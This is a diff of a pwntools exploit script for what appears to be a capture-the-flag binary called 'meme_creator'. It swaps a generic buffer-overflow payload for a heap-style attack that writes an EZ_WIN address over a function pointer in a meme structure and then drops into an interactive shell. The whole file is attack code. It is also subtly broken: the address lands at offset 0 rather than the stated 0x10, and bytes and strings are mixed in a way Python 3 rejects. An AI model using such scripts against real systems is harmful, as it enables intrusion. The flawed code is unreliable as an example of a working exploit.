@@ -1,18 +1,36 @@
 from pwn import *
-context.binary = './binary_name'  # Replace with the actual binary name
 
-# Establish a process or network connection to the target binary
-# Uncomment the appropriate line depending on whether you are running locally or remotely
-target = process('./binary_name')  # For local testing
-# target = remote('example.com', 1234)  # For remote exploitation
+# Adjust these values based on the actual environment
+binary_path = './meme_creator'
+remote_host = 'challenge.example.com'
+remote_port = 1337
+# Start the process or connect to the remote server
+if args.REMOTE:
+    p = remote(remote_host, remote_port)
+else:
+    p = process(binary_path)
 
-# Create a payload with a length that will overflow the passwd_buf
-# The buffer is 500 bytes, but the check only allows up to 8 characters
-# We will send exactly 8 characters plus some additional data to overflow
-payload = b'A' * 8 + b'B' * 100  # Adjust the second multiplier as needed
+# Find the offset for the function pointer in the meme structure
+meme_size = 0x20  # Size of the meme content
+func_ptr_offset = 0x10  # Offset of the function pointer in the meme structure
 
-# Send the crafted payload
-target.sendline(payload)
+# Address of the EZ_WIN function
+EZ_WIN_addr = 0x4014A0  # Replace with the actual address
 
-# Interact with the process if necessary
-target.interactive()
+# Create a new meme
+p.sendlineafter('Choice: ', '1')
+p.sendlineafter('Enter meme size: ', str(meme_size))
+p.sendlineafter('Enter meme content: ', 'A' * meme_size)
+
+# Edit the meme to overwrite the function pointer
+p.sendlineafter('Choice: ', '2')
+p.sendlineafter('Index: ', '0')
+p.sendlineafter('Enter meme content: ', p64(EZ_WIN_addr) + 'A' * (meme_size - func_ptr_offset))
+
+# Trigger the function pointer
+p.sendlineafter('Choice: ', '3')
+p.sendlineafter('Index: ', '0')
+
+# Interact with the shell
+p.interactive()
+
